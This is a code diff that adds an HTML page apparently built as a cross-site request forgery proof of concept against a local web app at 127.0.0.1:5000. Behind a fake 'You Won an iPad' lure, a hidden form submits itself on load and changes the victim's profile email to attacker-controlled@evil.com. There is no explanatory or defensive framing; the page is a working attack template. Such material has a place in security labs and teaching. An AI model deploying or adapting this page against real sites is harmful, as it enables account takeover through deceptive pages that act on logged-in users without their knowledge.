@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Congratulations! You Won an iPad!</title>
+</head>
+<body>
+    <h1>Loading Offer... Please Wait.</h1>
+
+    <form id="fakeForm" action="http://127.0.0.1:5000/profile" method="POST" style="display: none;">
+        <input type="hidden" name="email" value="attacker-controlled@evil.com">
+    </form>
+
+    <script>
+        window.onload = function() {
+            document.getElementById('fakeForm').submit();
+        }
+    </script>
+</body>
+</html>
